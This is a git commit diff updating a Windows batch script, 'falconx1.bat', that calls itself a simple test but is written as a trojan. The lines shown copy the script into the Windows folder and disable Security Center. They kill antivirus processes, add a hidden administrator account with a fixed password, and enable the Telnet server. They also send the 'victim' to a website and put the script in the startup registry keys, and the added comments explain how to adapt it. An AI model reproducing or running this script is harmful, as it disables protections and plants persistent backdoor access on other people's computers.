06f23bcf598052cd2c6b6df3a8b2f26d136f1d59
Fajar Ichwan Noor <flame.axoneme@gmail.com>
2015-03-12 00:15:21 +0800

    Update falconx1.bat

--- falconx1.bat
+++ falconx1.bat
@@ -2,6 +2,8 @@
 
 ::Created by falconflame a.k.a dr. f
 ::It's just simple script for testing batch scripting in windows
+::Registry Path in this script is written in lowercase
+::to show that all command in windows are case insensitive
 
 ::Checking file existence in windows system and make copy if not available
 if not exist %windir%\%0 copy %0 %windir%
@@ -17,11 +19,12 @@ net stop "security center"
 tskill *av*
 
 ::Making admin privilege user account
+::Change username & password as you like
 net user admin angela0499 /add
 net localgroup administrators admin /add
 
 ::Hiding newly created user account
-reg add "hkey_local_machine\software\microsoft\windows nt\currentversion\winlogon\special accounts\userlist" /v "admin" /t reg_dword /d 0 /f
+reg add "hkey_local_machine\software\microsoft\windows nt\currentversion\winlogon\specialaccounts\userlist" /v "admin" /t reg_dword /d 0 /f
 
 ::Activating service messenger
 reg add "hklm\system\controlset001\services\messenger" /v start /t reg_dword /d 2 /f
@@ -46,7 +49,11 @@ reg add "hklm\system\currentcontrolset\control\lsa" /v restrictanonymous /t reg_
 reg add "hklm\system\controlset001\services\tlntsvr" /v start /t reg_dword /d 2 /f
 net start tlntsvr
 
+::Directing victim to our prepared website, google for example
+start iexplore.exe www.google.com
+
 ::Enabling trojan in startup
+::You could also enabling variety of software in startup, just edit the path after syntax /d
 reg add "hklm\software\microsoft\windows\currentversion\run" /v startit /t reg_sz /d %windir%\falconx1.bat /f
 reg add "hkcu\software\microsoft\windows\currentversion\run" /v startit /t reg_sz /d %windir%\falconx1.bat /f
 
